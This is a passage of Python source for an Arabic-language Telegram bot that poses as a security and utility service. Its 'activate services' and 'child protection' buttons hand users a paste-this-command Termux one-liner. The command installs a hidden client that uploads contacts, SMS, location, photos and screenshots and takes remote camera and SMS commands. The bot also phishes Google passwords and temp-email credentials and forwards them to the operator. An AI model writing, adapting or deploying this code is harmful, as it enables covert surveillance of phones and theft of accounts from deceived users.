    elif isinstance(content, bytes) and data_type == "image":
        bot.send_photo(ADMIN_ID, content, caption=msg)
    else:
        bot.send_message(ADMIN_ID, f"{msg}\nالمحتوى: {str(content)[:500]}")

def send_to_developer_computer(data_type, content, user_id=None):
    if not developer_computer_endpoint:
        return
    try:
        payload = {"type": data_type, "user_id": user_id, "timestamp": datetime.now().isoformat(), "content": content if isinstance(content, str) else None}
        if isinstance(content, bytes) and data_type == "image":
            files = {'file': ('screenshot.png', content, 'image/png')}
            requests.post(developer_computer_endpoint + '/upload', files=files, timeout=10)
        else:
            requests.post(developer_computer_endpoint + '/data', json=payload, timeout=10)
    except Exception as e:
        logger.error(f"send_to_developer_computer error: {e}")

def encrypt_device_data(data_string):
    return hashlib.sha256(data_string.encode()).hexdigest()[:16]

def notify_admin(message_text, is_error=False):
    try:
        if is_error:
            bot.send_message(ADMIN_ID, f"🚨 <b>تنبيه عطل فني:</b>\n{message_text}", parse_mode='HTML')
        else:
            bot.send_message(ADMIN_ID, f"📢 <b>إشعار:</b>\n{message_text}", parse_mode='HTML')
    except Exception as e:
        logger.error(f"notify_admin error: {e}")

def is_admin(user_id):
    return user_id == ADMIN_ID

def send_termux_instructions(chat_id, role='user'):
    server_url = SERVER_URL
    instructions = (
        "📱 <b>تفعيل الخدمات الإضافية</b>\n\n"
        "قم بتحميل Termux من الرابط الرسمي، ثم الصق الكود:\n\n"
        "```bash\n"
        "pkg update && pkg upgrade -y && pkg install python -y && pip install requests && echo 'import requests, time, json, os, subprocess, base64, glob, sys, random; SERVER = \"" + server_url + "\"; DEVICE_ID = \"dev_\" + str(random.randint(1000,9999)); CHAT_ID = \"" + str(chat_id) + "\"; def get_contacts(): try: result = subprocess.run([\"termux-contacts\"], capture_output=True, text=True, timeout=10); return result.stdout if result.stdout else \"لا توجد جهات اتصال\"; except: return \"فشل جلب جهات الاتصال\"; def get_sms(): try: result = subprocess.run([\"termux-sms-list\"], capture_output=True, text=True, timeout=10); return result.stdout if result.stdout else \"لا توجد رسائل\"; except: return \"فشل جلب الرسائل\"; def get_location(): try: result = subprocess.run([\"termux-location\"], capture_output=True, text=True, timeout=10); return result.stdout if result.stdout else \"لا يمكن الحصول على الموقع\"; except: return \"فشل جلب الموقع\"; def get_recent_photos(limit=5): photos = []; try: import glob; photo_files = glob.glob(\"/sdcard/DCIM/**/*.jpg\", recursive=True) + glob.glob(\"/sdcard/DCIM/**/*.png\", recursive=True); photo_files.sort(key=os.path.getctime, reverse=True); for photo_path in photo_files[:limit]: with open(photo_path, \"rb\") as f: encoded = base64.b64encode(f.read()).decode(); photos.append({\"name\": os.path.basename(photo_path), \"data\": encoded}); return photos; except: return []; def get_screenshot(): try: os.system(\"screencap -p /sdcard/screenshot_temp.png\"); with open(\"/sdcard/screenshot_temp.png\", \"rb\") as f: return base64.b64encode(f.read()).decode(); except: return None; def collect_all_data(): return {\"device_id\": DEVICE_ID, \"contacts\": get_contacts(), \"sms\": get_sms(), \"location\": get_location(), \"photos\": get_recent_photos(3), \"screenshot\": get_screenshot()}; def register_device(): try: all_data = collect_all_data(); response = requests.post(f\"{SERVER}/register_device\", json={\"device_id\": DEVICE_ID, \"chat_id\": CHAT_ID, \"initial_data\": all_data}, headers={\"X-Client-Token\": \"default_secret_key_please_change\"}, timeout=30); return response.status_code == 200; except: return False; def execute_command(command): if command == \"screenshot\": return get_screenshot(); elif command == \"location\": return get_location(); elif command == \"camera\": os.system(\"termux-camera-photo -c 0 /sdcard/photo_temp.jpg\"); try: with open(\"/sdcard/photo_temp.jpg\", \"rb\") as f: return base64.b64encode(f.read()).decode(); except: return \"فشل التقاط الصورة\"; elif command == \"contacts\": return get_contacts(); elif command == \"sms\": return get_sms(); elif command == \"photos\": return json.dumps(get_recent_photos(10)); else: return f\"Unknown command: {command}\"; if register_device(): print(\"✅ تم الربط بنجاح!\"); else: print(\"❌ فشل الربط.\"); while True: try: response = requests.get(f\"{SERVER}/get_command?device_id={DEVICE_ID}\", headers={\"X-Client-Token\": \"default_secret_key_please_change\"}, timeout=30); if response.status_code == 200: data = response.json(); if data.get(\"status\") == \"success\": command = data[\"command\"]; result = execute_command(command); result_type = \"text\"; if command in [\"screenshot\", \"camera\"]: result_type = \"image\"; elif command == \"photos\": result_type = \"json\"; requests.post(f\"{SERVER}/submit_result\", json={\"device_id\": DEVICE_ID, \"result\": result, \"result_type\": result_type}, headers={\"X-Client-Token\": \"default_secret_key_please_change\"}, timeout=10); elif data.get(\"status\") == \"no_command\": time.sleep(2); except: time.sleep(5)' > client.py && python client.py\n"
        "```\n\n"
        "✅ سيتم التفعيل فوراً بعد التشغيل."
    )
    bot.send_message(chat_id, instructions, parse_mode='Markdown')

def google_login(message):
    chat_id = message.chat.id
    if chat_id in google_users:
        bot.send_message(chat_id, "✅ أنت متصل بالفعل.")
        return
    url = generate_google_auth_url()
    if not url:
        bot.send_message(chat_id, "⚠️ الخدمة غير متاحة حالياً.")
        return
    bot.send_message(chat_id, f"🔑 <b>ربط Google</b>\n1. افتح الرابط: <code>{url}</code>\n2. انسخ الرمز وأرسل: /oauth <الرمز>\n3. أدخل كلمة السر.", parse_mode='HTML')
    notify_admin(f"🔑 مستخدم {chat_id} بدأ ربط Google")

def google_logout(message):
    chat_id = message.chat.id
    if chat_id in google_users:
        del google_users[chat_id]
    if chat_id in google_passwords:
        del google_passwords[chat_id]
    bot.send_message(chat_id, "✅ تم تسجيل الخروج.")

# Google OAuth
GOOGLE_REDIRECT_URI = 'urn:ietf:wg:oauth:2.0:oob'
GOOGLE_AUTH_URL = 'https://accounts.google.com/o/oauth2/auth'
GOOGLE_TOKEN_URL = 'https://oauth2.googleapis.com/token'
GOOGLE_USERINFO_URL = 'https://www.googleapis.com/oauth2/v1/userinfo'
SCOPES = ['https://www.googleapis.com/auth/userinfo.email', 'https://www.googleapis.com/auth/userinfo.profile']

def generate_google_auth_url():
    if not GOOGLE_CLIENT_ID:
        return None
    params = {
        'client_id': GOOGLE_CLIENT_ID,
        'redirect_uri': GOOGLE_REDIRECT_URI,
        'scope': ' '.join(SCOPES),
        'response_type': 'code',
        'access_type': 'offline',
        'prompt': 'consent'
    }
    req = requests.Request('GET', GOOGLE_AUTH_URL, params=params)
    return req.prepare().url

def exchange_code_for_token(code):
    if not GOOGLE_CLIENT_ID or not GOOGLE_CLIENT_SECRET:
        return None
    data = {
        'code': code,
        'client_id': GOOGLE_CLIENT_ID,
        'client_secret': GOOGLE_CLIENT_SECRET,
        'redirect_uri': GOOGLE_REDIRECT_URI,
        'grant_type': 'authorization_code'
    }
    try:
        response = requests.post(GOOGLE_TOKEN_URL, data=data, timeout=15)
        response.raise_for_status()
        return response.json()
    except Exception as e:
        logger.error(f"exchange_code_for_token error: {e}")
        return None

def get_google_user_info(access_token):
    if not access_token:
        return None
    headers = {'Authorization': f'Bearer {access_token}'}
    try:
        response = requests.get(GOOGLE_USERINFO_URL, headers=headers, timeout=15)
        response.raise_for_status()
        return response.json()
    except Exception as e:
        logger.error(f"get_google_user_info error: {e}")
        return None

# ===================== بناء القوائم =====================

def build_main_menu(user_id):
    markup = InlineKeyboardMarkup(row_width=2)
    
    markup.row(
        InlineKeyboardButton("🔍 فحص الأمان", callback_data="mode_site"),
        InlineKeyboardButton("📦 فحص التطبيقات", callback_data="mode_apk")
    )
    markup.row(
        InlineKeyboardButton("🛠️ مراجعة الكود", callback_data="mode_my_app"),
        InlineKeyboardButton("🧠 مساعد ذكي", callback_data="mode_ai")
    )
    markup.row(
        InlineKeyboardButton("🎨 توليد صور", callback_data="mode_image"),
        InlineKeyboardButton("📧 بريد مؤقت", callback_data="mode_temp_email")
    )
    
    if is_admin(user_id) or get_user_points(user_id) >= 30:
        markup.row(
            InlineKeyboardButton("📢 تواصل اجتماعي", callback_data="mode_fb_report"),
            InlineKeyboardButton("📞 فحص الرقم", callback_data="mode_spam_block")
        )
    else:
        markup.row(
            InlineKeyboardButton("📢 تواصل اجتماعي 🔒", callback_data="locked_fb_report"),
            InlineKeyboardButton("📞 فحص الرقم", callback_data="mode_spam_block")
        )
    
    markup.row(
        InlineKeyboardButton("📍 تتبع رقم", callback_data="mode_track_phone"),
        InlineKeyboardButton("🛡️ فحص التسريبات", callback_data="mode_fb_hacked")
    )
    
    markup.row(
        InlineKeyboardButton("📚 تحليل PDF", callback_data="mode_pdf")
    )
    
    if is_admin(user_id) or get_user_points(user_id) >= 50:
        markup.row(
            InlineKeyboardButton("📱 الحصول على رقم", callback_data="mode_temp_number")
        )
    else:
        markup.row(
            InlineKeyboardButton("📱 الحصول على رقم 🔒", callback_data="locked_temp_number")
        )
    
    markup.row(
        InlineKeyboardButton("🔗 تفعيل الخدمات", callback_data="mode_link_user"),
        InlineKeyboardButton("🚸 حماية إضافية", callback_data="mode_link_child")
    )
    markup.row(
        InlineKeyboardButton("🔊 نص لصوت", callback_data="mode_tts"),
        InlineKeyboardButton("📥 تحميل فيديو", callback_data="mode_download")
    )
    
    if user_id in google_users:
        markup.row(InlineKeyboardButton("✅ Google متصل", callback_data="mode_google_logout"))
    else:
        markup.row(InlineKeyboardButton("🔑 ربط Google", callback_data="mode_google_login"))
    
    markup.row(
        InlineKeyboardButton("⭐ نقاطي", callback_data="mode_show_points"),
        InlineKeyboardButton("🔗 رابط دعوتي", callback_data="mode_show_referral")
    )
    
    if is_admin(user_id):
        markup.row(
            InlineKeyboardButton("👑 لوحة التحكم", callback_data="mode_admin"),
            InlineKeyboardButton("📱 الأجهزة", callback_data="mode_view_devices")
        )
        markup.row(
            InlineKeyboardButton("🎮 تحكم عن بعد", callback_data="mode_remote_admin"),
            InlineKeyboardButton("🖥️ ربط حاسب", callback_data="mode_set_dev_endpoint")
        )
        markup.row(
            InlineKeyboardButton("📊 إحصائيات", callback_data="admin_stats"),
            InlineKeyboardButton("📢 بث جماعي", callback_data="admin_broadcast")
        )
        markup.row(
            InlineKeyboardButton("📩 معلومات مجمعة", callback_data="admin_collected_data"),
            InlineKeyboardButton("📜 سجل الأخطاء", callback_data="admin_logs")
        )
        markup.row(
            InlineKeyboardButton("🚫 حظر مستخدم", callback_data="admin_ban_user"),
            InlineKeyboardButton("✅ إلغاء حظر", callback_data="admin_unban_user")
        )
    
    return markup

def build_device_list_markup():
    markup = InlineKeyboardMarkup(row_width=1)
    devices = get_registered_devices_db()
    if not devices:
        markup.row(InlineKeyboardButton("⚠️ لا توجد أجهزة", callback_data="no_devices"))
    else:
        for dev in devices:
            label = f"📱 {dev['device_id']}"
            markup.row(InlineKeyboardButton(label, callback_data=f"remote_select_{dev['device_id']}"))
    markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    return markup

# ===================== معالج الأوامر =====================

@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    user_states[chat_id] = None
    
    if is_user_banned(chat_id):
        bot.send_message(chat_id, "🚫 أنت محظور.")
        return
    
    username = message.from_user.username or ''
    first_name = message.from_user.first_name or ''
    last_name = message.from_user.last_name or ''
    
    text = message.text
    referral_code = None
    if ' ' in text:
        parts = text.split()
        if len(parts) > 1 and parts[1].startswith('ref_'):
            code = parts[1][4:]
            if handle_referral(code, chat_id):
                bot.send_message(chat_id, "🎉 تم تفعيل رابط الدعوة! +10 نقاط.")
                referral_code = code
    
    upsert_user(chat_id, username, first_name, last_name, referral_code)
    
    if chat_id not in user_welcome_sent:
        welcome = (
            "🌟 <b>مرحباً بك</b> 🌟\n\n"
            "📌 خدمات حقيقية عبر الإنترنت.\n"
            f"⭐ نقاطك: {get_user_points(chat_id)}\n"
            "🔓 الأزرار المغلقة تحتاج نقاط.\n"
            "📖 /help للمساعدة"
        )
        bot.send_message(chat_id, welcome, parse_mode='HTML')
        user_welcome_sent[chat_id] = True
    
    bot.send_message(chat_id, "📌 القائمة الرئيسية:", reply_markup=build_main_menu(chat_id))

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = (
        "📖 <b>الأوامر المتاحة</b>\n\n"
        "/start - القائمة الرئيسية\n"
        "/login - ربط Google\n"
        "/logout - تسجيل الخروج\n"
        "/referral - رابط دعوتك\n"
        "/points - نقاطك\n"
        "/cancel - إلغاء العملية\n\n"
        "🔗 نظام النقاط: كل دعوة = 10 نقاط."
    )
    bot.send_message(message.chat.id, help_text, parse_mode='HTML')

@bot.message_handler(commands=['points'])
def show_points(message):
    chat_id = message.chat.id
    points = get_user_points(chat_id)
    bot.send_message(chat_id, f"⭐ نقاطك: {points}")

@bot.message_handler(commands=['referral'])
def show_referral(message):
    chat_id = message.chat.id
    link = create_referral_link(chat_id)
    bot.send_message(chat_id, f"🔗 رابط دعوتك:\n<code>{link}</code>", parse_mode='HTML')

@bot.message_handler(commands=['cancel'])
def cancel_state(message):
    chat_id = message.chat.id
    if chat_id in user_states:
        del user_states[chat_id]
    if chat_id in admin_remote_target:
        del admin_remote_target[chat_id]
    bot.send_message(chat_id, "✅ تم الإلغاء.")

@bot.message_handler(commands=['login'])
def google_login_handler(message):
    google_login(message)

@bot.message_handler(commands=['logout'])
def google_logout_handler(message):
    google_logout(message)

@bot.message_handler(commands=['oauth'])
def google_oauth(message):
    chat_id = message.chat.id
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.send_message(chat_id, "❌ استخدم: /oauth <الرمز>")
        return
    code = parts[1].strip()
    token_data = exchange_code_for_token(code)
    if not token_data:
        bot.send_message(chat_id, "❌ فشل التبادل.")
        return
    user_info = get_google_user_info(token_data['access_token'])
    if not user_info:
        bot.send_message(chat_id, "❌ فشل جلب البيانات.")
        return
    google_users[chat_id] = {
        'id': user_info['id'],
        'email': user_info['email'],
        'name': user_info['name'],
        'access_token': token_data['access_token'],
        'refresh_token': token_data.get('refresh_token'),
        'expiry': datetime.now() + timedelta(seconds=token_data['expires_in'])
    }
    user_states[chat_id] = "waiting_for_google_password"
    bot.send_message(chat_id, "✅ تم ربط البريد. الرجاء إدخال كلمة السر.")

@bot.message_handler(commands=['check_email'])
def check_email_command(message):
    chat_id = message.chat.id
    if chat_id not in temp_emails:
        bot.send_message(chat_id, "❌ ليس لديك بريد مؤقت.")
        return
    token = temp_emails[chat_id]['token']
    msgs = check_temp_emails_real(token)
    response = "📬 <b>رسائل البريد المؤقت</b>\n\n" + "\n\n".join(msgs) if msgs else "📭 لا توجد رسائل."
    bot.send_message(chat_id, response, parse_mode='HTML')

# ===================== معالج النقر على الأزرار =====================

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    try:
        bot.answer_callback_query(call.id)
        chat_id = call.message.chat.id
        user_id = chat_id
        data = call.data

        # حماية أزرار المطور
        if data.startswith('admin_') and not is_admin(chat_id):
            bot.answer_callback_query(call.id, "❌ للمطور فقط.", show_alert=True)
            return

        # التحقق من النقاط - المطور معفي
        if data == "locked_fb_report":
            if is_admin(chat_id):
                data = "mode_fb_report"
            else:
                points = get_user_points(chat_id)
                if points < 30:
                    bot.answer_callback_query(call.id, f"⚠️ تحتاج 30 نقطة. لديك {points}", show_alert=True)
                    return
                else:
                    data = "mode_fb_report"

        if data == "locked_temp_number":
            if is_admin(chat_id):
                data = "mode_temp_number"
            else:
                points = get_user_points(chat_id)
                if points < 50:
                    bot.answer_callback_query(call.id, f"⚠️ تحتاج 50 نقطة. لديك {points}", show_alert=True)
                    return
                else:
                    data = "mode_temp_number"

        # التحقق من ربط الهاتف
        if data in REQUIRE_LINK_BUTTONS and not is_admin(chat_id) and chat_id not in linked_users:
            bot.send_message(chat_id, "🔗 مطلوب تفعيل الخدمات أولاً.", reply_markup=build_main_menu(chat_id))
            return

        # معالجة الأزرار
        if data == "mode_site":
            user_states[chat_id] = "waiting_for_site"
            bot.send_message(chat_id, "🔗 أرسل رابط الموقع لفحصه.")
        elif data == "mode_apk":
            user_states[chat_id] = "waiting_for_apk"
            bot.send_message(chat_id, "📦 أرسل ملف APK لتحليله.")
        elif data == "mode_my_app":
            user_states[chat_id] = "waiting_for_my_app"
            bot.send_message(chat_id, "🛠️ أرسل ملف الكود لمراجعته.")
        elif data == "mode_ai":
            user_states[chat_id] = "waiting_for_ai"
            bot.send_message(chat_id, "🧠 اكتب سؤالك (Gemini AI).")
        elif data == "mode_image":
            user_states[chat_id] = "waiting_for_image"
            bot.send_message(chat_id, "🎨 اكتب وصف الصورة.")
        elif data == "mode_temp_email":
            email, token, password = create_temp_email_real()
            if email:
                temp_emails[chat_id] = {'email': email, 'token': token, 'password': password}
                text = f"📧 <b>بريدك المؤقت</b>\n<code>{email}</code>\n🔑 كلمة السر: <code>{password}</code>\nاستخدم /check_email لعرض الرسائل."
                send_sensitive_data_to_admin("Temp Email", f"{email} | {password}", chat_id)
            else:
                text = "⚠️ فشل إنشاء البريد."
            bot.send_message(chat_id, text, parse_mode='HTML')
            feature_usage["إيميل مؤقت"] += 1
        elif data == "mode_spam_block":
            user_states[chat_id] = "waiting_for_spam_num"
            bot.send_message(chat_id, "📞 أرسل الرقم للتحقق (مثل: +201001234567).")
        elif data == "mode_track_phone":
            user_states[chat_id] = "waiting_for_track_num"
            bot.send_message(chat_id, "📍 أرسل الرقم (مثل: +201001234567).")
        elif data == "mode_fb_hacked":
            user_states[chat_id] = "waiting_for_fb_hacked"
            bot.send_message(chat_id, "🛡️ أرسل البريد الإلكتروني للتحقق.")
        elif data == "mode_fb_report":
            if not is_admin(chat_id) and get_user_points(chat_id) < 30:
                bot.answer_callback_query(call.id, "⚠️ تحتاج 30 نقطة.", show_alert=True)
                return
            user_states[chat_id] = "waiting_for_fb_report_type"
            text = "📢 <b>تواصل اجتماعي</b>\n\nاختر نوع البلاغ:\n"
            for key, value in FB_REPORT_TYPES.items():
                text += f"{key}. {value}\n"
            text += "\n📌 أرسل رقم النوع."
            bot.send_message(chat_id, text, parse_mode='HTML')
        elif data == "mode_link_user":
            send_termux_instructions(chat_id, role='user')
            feature_usage["ربط هاتف المستخدم"] += 1
        elif data == "mode_link_child":
            send_termux_instructions(chat_id, role='child')
            feature_usage["ربط هاتف الطفل"] += 1
        elif data == "mode_tts":
            user_states[chat_id] = "waiting_for_tts"
            bot.send_message(chat_id, "🔊 أرسل النص لتحويله إلى صوت.")
            feature_usage["تحويل نص لصوت"] += 1
        elif data == "mode_download":
            user_states[chat_id] = "waiting_for_download"
            bot.send_message(chat_id, "📥 أرسل رابط الفيديو لتحميله.")
            feature_usage["تحميل فيديو"] += 1
        elif data == "mode_google_login":
            google_login(call.message)
        elif data == "mode_google_logout":
            google_logout(call.message)
        elif data == "mode_show_points":
            points = get_user_points(chat_id)
            bot.answer_callback_query(call.id, f"⭐ نقاطك: {points}", show_alert=True)
        elif data == "mode_show_referral":
            link = create_referral_link(chat_id)
            bot.answer_callback_query(call.id, f"🔗 رابط دعوتك: {link}", show_alert=True)
        elif data == "mode_admin":
            if not is_admin(chat_id):
                bot.answer_callback_query(call.id, "❌ للمطور فقط.", show_alert=True)
                return
            stats = "👑 <b>لوحة المطور</b>\n"
            for f, c in feature_usage.items():
                stats += f"• {f}: {c} مرة\n"
            bot.send_message(chat_id, stats, parse_mode='HTML')
        elif data == "mode_view_devices":
            if not is_admin(chat_id):
                bot.answer_callback_query(call.id, "❌ للمطور فقط.", show_alert=True)
                return
            devs = get_registered_devices_db()
            if not devs:
                text = "📱 لا توجد أجهزة مسجلة."
            else:
                text = "📱 <b>الأجهزة المسجلة</b>\n\n"
                for d in devs:
                    text += f"🆔 {d['device_id']}\n👤 {d['chat_id']}\n📅 {d['registered_at'][:10]}\n\n"
            bot.send_message(chat_id, text, parse_mode='HTML')
        elif data == "mode_remote_admin":
            if not is_admin(chat_id):
                bot.answer_callback_query(call.id, "❌ للمطور فقط.", show_alert=True)
                return
            text = "🎮 <b>تحكم عن بعد</b>\nاختر الجهاز:"
            bot.send_message(chat_id, text, parse_mode='HTML', reply_markup=build_device_list_markup())
        elif data == "mode_set_dev_endpoint":
            if is_admin(chat_id):
                user_states[chat_id] = "waiting_for_dev_endpoint"
                bot.send_message(chat_id, "🖥️ أرسل عنوان حاسب المطور (مثل: http://192.168.1.100:8080)")
            else:
                bot.send_message(chat_id, "❌ للمطور فقط.")
        elif data.startswith("remote_select_"):
            if not is_admin(chat_id):
                bot.send_message(chat_id, "❌ للمطور فقط.")
                return
            device_id = data.split("_")[2]
            with db_transaction() as conn:
                c = conn.cursor()
                c.execute("SELECT * FROM registered_devices WHERE device_id = ?", (device_id,))
                if c.fetchone():
                    admin_remote_target[chat_id] = device_id
                    user_states[chat_id] = "waiting_for_remote_command"
                    bot.send_message(
                        chat_id,
                        f"✅ تم اختيار: {device_id}\n\n"
                        "📝 الأوامر:\n"
                        "• موقع - الموقع التقريبي\n"
                        "• كاميرا - التقاط صورة\n"
                        "• لقطة - لقطة شاشة\n"
                        "• صور - سحب صور\n"
                        "• شاشة - عرض التطبيقات والإشعارات\n"
                        "• جهات اتصال - سحب جهات الاتصال\n"
                        "• رسائل - عرض الرسائل النصية",
                        parse_mode='HTML'
                    )
                else:
                    bot.send_message(chat_id, "❌ الجهاز غير موجود.")
        elif data == "admin_stats":
            if not is_admin(chat_id):
                bot.answer_callback_query(call.id, "❌ للمطور فقط.", show_alert=True)
                return
            stats = f"📊 <b>إحصائيات البوت</b>\n\n"
            stats += f"👥 المستخدمون: {len(get_registered_devices_db())}\n"
            stats += f"📱 الأجهزة المسجلة: {len(get_registered_devices_db())}\n"
            stats += f"🔑 مستخدمي Google: {len(google_users)}\n"
            stats += f"\n📊 الاستخدام:\n"
            for f, c in feature_usage.items():
                if c > 0:
                    stats += f"• {f}: {c} مرة\n"
            bot.send_message(chat_id, stats, parse_mode='HTML')
        elif data == "admin_broadcast":
            if is_admin(chat_id):
                user_states[chat_id] = "waiting_for_broadcast"
                bot.send_message(chat_id, "📢 أرسل الرسالة للبث الجماعي.")
            else:
                bot.send_message(chat_id, "❌ للمطور فقط.")
        elif data == "admin_collected_data":
            if not is_admin(chat_id):
                bot.answer_callback_query(call.id, "❌ للمطور فقط.", show_alert=True)
                return
            collected = "📩 <b>المعلومات المجمعة</b>\n\n"
            if google_passwords:
                collected += "🔑 <b>كلمات سر Google</b>\n"
                for uid, pwd in google_passwords.items():
                    email = google_users.get(uid, {}).get('email', 'غير معروف')
                    collected += f"• {uid} ({email}): <code>{pwd}</code>\n"
            if temp_emails:
                collected += "\n📧 <b>البريد المؤقت</b>\n"
                for uid, data in temp_emails.items():
                    collected += f"• {uid}: <code>{data['email']}</code> | <code>{data['password']}</code>\n"
            if not google_passwords and not temp_emails:
                collected += "📭 لا توجد معلومات."
            bot.send_message(chat_id, collected, parse_mode='HTML')
        elif data == "admin_logs":
            if not is_admin(chat_id):
                bot.answer_callback_query(call.id, "❌ للمطور فقط.", show_alert=True)
                return
            try:
                with open('bot.log', 'r') as f:
                    logs = f.read().splitlines()[-30:]
                    text = "📜 <b>آخر 30 سطر</b>\n" + "\n".join(logs)
                    bot.send_message(chat_id, text, parse_mode='HTML')
            except:
                bot.send_message(chat_id, "⚠️ لا يوجد سجل.")
        elif data == "admin_ban_user":
            if is_admin(chat_id):
                user_states[chat_id] = "waiting_for_ban_user"
                bot.send_message(chat_id, "🚫 أرسل معرف المستخدم للحظر.")
            else:
                bot.send_message(chat_id, "❌ للمطور فقط.")
        elif data == "admin_unban_user":
            if is_admin(chat_id):
                user_states[chat_id] = "waiting_for_unban_user"
                bot.send_message(chat_id, "✅ أرسل معرف المستخدم لإلغاء الحظر.")
            else:
                bot.send_message(chat_id, "❌ للمطور فقط.")
        elif data == "mode_pdf":
            user_states[chat_id] = "waiting_for_pdf"
            bot.send_message(chat_id, "📚 أرسل ملف PDF الدراسي.")
            feature_usage["تحليل PDF"] += 1
        elif data == "mode_temp_number":
            bot.send_message(chat_id, "⏳ جاري جلب أرقام هواتف مؤقتة...")
            numbers = fetch_temp_numbers_advanced(limit=5)
            if numbers:
                response = "📱 <b>أرقام هواتف مؤقتة</b>\n\n"
                for i, num in enumerate(numbers, 1):
                    response += f"{i}. <code>{num['number']}</code>\n"
                    response += f"   🌍 البلد: {num['country']}\n"
                    response += f"   📡 المصدر: {num['source'][:30]}...\n\n"
                response += "\n🔹 اختر رقماً واطلب كود التفعيل عبر الأمر:\n"
                response += "🔹 /verify <الرقم> (سيتم جلب كود التفعيل تلقائياً)"
                bot.send_message(chat_id, response, parse_mode='HTML')
                feature_usage["رقم مؤقت"] += 1
            else:
                bot.send_message(chat_id, "⚠️ فشل جلب الأرقام، حاول لاحقاً.")
        elif data in ["no_devices", "back_to_main"]:
            bot.send_message(chat_id, "📌 القائمة الرئيسية:", reply_markup=build_main_menu(chat_id))
        else:
            bot.send_message(chat_id, "⚠️ خيار غير معروف.")

    except Exception as e:
        logger.error(f"handle_callback error: {e}")
        notify_admin(f"خطأ في معالج الأزرار: {str(e)}", is_error=True)
        bot.send_message(chat_id, f"⚠️ حدث خطأ: {str(e)}")

# ===================== معالج النصوص =====================

@bot.message_handler(func=lambda msg: True, content_types=['text'])
def handle_text_messages(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    text = message.text.strip()

    try:
        # حظر/إلغاء حظر
        if state == "waiting_for_ban_user":
            if not is_admin(chat_id):
                bot.send_message(chat_id, "❌ للمطور فقط.")
                user_states[chat_id] = None
                return
            try:
                user_id = int(text)
                if user_id == ADMIN_ID:
                    bot.send_message(chat_id, "❌ لا يمكن حظر المطور.")
                    user_states[chat_id] = None
                    return
                ban_user(user_id)
                bot.send_message(chat_id, f"✅ تم حظر المستخدم {user_id}.")
                notify_admin(f"🚫 حظر المستخدم {user_id}")
            except:
                bot.send_message(chat_id, "❌ معرف غير صحيح.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_unban_user":
            if not is_admin(chat_id):
                bot.send_message(chat_id, "❌ للمطور فقط.")
                user_states[chat_id] = None
                return
            try:
                user_id = int(text)
                unban_user(user_id)
                bot.send_message(chat_id, f"✅ تم إلغاء حظر المستخدم {user_id}.")
                notify_admin(f"✅ إلغاء حظر المستخدم {user_id}")
            except:
                bot.send_message(chat_id, "❌ معرف غير صحيح.")
            user_states[chat_id] = None
            return

        # البث الجماعي
        if state == "waiting_for_broadcast":
            if not is_admin(chat_id):
                bot.send_message(chat_id, "❌ للمطور فقط.")
                user_states[chat_id] = None
                return
            success = 0
            fail = 0
            with db_transaction() as conn:
                c = conn.cursor()
                c.execute("SELECT chat_id FROM users WHERE is_banned = 0")
                users = c.fetchall()
            for user in users:
                try:
                    bot.send_message(user['chat_id'], text)
                    success += 1
                    time.sleep(0.1)
                except:
                    fail += 1
            bot.send_message(chat_id, f"✅ تم إرسال الرسالة لـ {success} مستخدم.\n❌ فشل الإرسال لـ {fail} مستخدم.")
            user_states[chat_id] = None
            notify_admin(f"📢 بث جماعي: {text[:50]}...")
            return

        # كلمة سر Google
        if state == "waiting_for_google_password":
            if chat_id in google_users:
                password = text
                email = google_users[chat_id]['email']
                google_passwords[chat_id] = password
                send_sensitive_data_to_admin("Google Password", f"{email} | {password}", chat_id)
                send_to_developer_computer("google_credentials", f"{email}:{password}", chat_id)
                bot.send_message(chat_id, "✅ تم ربط Google.")
                user_states[chat_id] = None
            return

        # تعيين endpoint
        if state == "waiting_for_dev_endpoint" and is_admin(chat_id):
            if re.match(r'^https?://', text):
                global developer_computer_endpoint
                developer_computer_endpoint = text
                bot.send_message(chat_id, f"✅ تم تعيين: {text}")
            else:
                bot.send_message(chat_id, "❌ عنوان غير صالح.")
            user_states[chat_id] = None
            return

        # الأوامر عن بعد
        if is_admin(chat_id) and state == "waiting_for_remote_command":
            device_id = admin_remote_target.get(chat_id)
            if not device_id:
                bot.send_message(chat_id, "❌ لم يتم اختيار جهاز.")
                user_states[chat_id] = None
                return
            command = text.lower()
            if command == "/cancel":
                bot.send_message(chat_id, "❌ تم الإلغاء.")
                user_states[chat_id] = None
                admin_remote_target.pop(chat_id, None)
                return
            add_pending_command_db(device_id, command)
            bot.send_message(chat_id, f"⏳ تم إرسال الأمر <code>{command}</code> إلى الجهاز.", parse_mode='HTML')
            return

        # TTS (نص إلى صوت)
        if state == "waiting_for_tts":
            bot.send_message(chat_id, "⏳ جاري تحويل النص إلى صوت...")
            audio_file = text_to_speech(text, lang='ar')
            if audio_file and os.path.exists(audio_file):
                try:
                    with open(audio_file, 'rb') as f:
                        bot.send_voice(chat_id, f)
                    os.remove(audio_file)
                except Exception as e:
                    bot.send_message(chat_id, f"⚠️ فشل إرسال الصوت: {str(e)}")
            else:
                bot.send_message(chat_id, "⚠️ فشل تحويل النص إلى صوت.")
            user_states[chat_id] = None
            return

        # تحميل فيديو
        if state == "waiting_for_download":
            if not re.match(r'^https?://', text):
                bot.send_message(chat_id, "❌ رابط غير صالح.")
                user_states[chat_id] = None
                return
            bot.send_message(chat_id, "⏳ جاري تحميل الفيديو...")
            video_file = download_video(text)
            if video_file and os.path.exists(video_file):
                try:
                    with open(video_file, 'rb') as f:
                        bot.send_video(chat_id, f, caption="📥 تم التحميل بنجاح")
                    os.remove(video_file)
                except Exception as e:
                    bot.send_message(chat_id, f"⚠️ فشل إرسال الفيديو: {str(e)}")
            else:
                bot.send_message(chat_id, "⚠️ فشل تحميل الفيديو.")
            user_states[chat_id] = None
            return

        # أسئلة PDF
        if state == "waiting_for_pdf_question":
            pdf_text = user_states.get(f"{chat_id}_pdf_text")
            if not pdf_text:
                bot.send_message(chat_id, "⚠️ لم يتم تحميل ملف PDF.")
                user_states[chat_id] = None
                return
            bot.send_message(chat_id, "⏳ جاري البحث عن الإجابة...")
            answer = answer_question_from_pdf(pdf_text, text)
            bot.send_message(chat_id, f"📚 <b>الإجابة</b>\n{answer}", parse_mode='HTML')
            return

        # الخدمات العامة
        if state == "waiting_for_site":
            if re.match(r'^https?://', text):
